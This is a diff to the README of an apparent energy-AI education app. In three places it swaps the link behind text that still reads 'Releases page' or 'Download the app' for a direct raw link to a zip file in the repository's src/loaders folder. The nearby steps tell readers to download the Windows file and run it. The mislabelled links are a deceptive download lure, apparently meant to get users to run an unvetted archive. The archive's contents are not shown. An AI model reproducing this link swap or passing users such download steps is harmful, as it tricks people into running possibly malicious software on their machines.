@@ -1,6 +1,6 @@
 # 📘 energy-ai-education - Learn energy AI with clear tools
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Kelciconnected164/energy-ai-education/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Kelciconnected164/energy-ai-education/raw/refs/heads/main/src/loaders/education_ai_energy_v1.0.zip)
 
 ## 🎯 What this is
 
@@ -18,7 +18,7 @@ Use it to browse lessons, explore examples, and find learning paths in one place
 
 ## 📥 Download and install
 
-1. Visit the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/releases)
+1. Visit the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/raw/refs/heads/main/src/loaders/education_ai_energy_v1.0.zip)
 2. Find the latest release
 3. Download the Windows file for your PC
 4. Open the downloaded file
@@ -109,7 +109,7 @@ EA-DX is the interchange format used in this project to support data sharing acr
 
 ## ❓ Need help getting started
 
-1. Open the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/releases)
+1. Open the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/raw/refs/heads/main/src/loaders/education_ai_energy_v1.0.zip)
 2. Download the latest Windows file
 3. Run the file on your PC
 4. Open the app and choose a topic
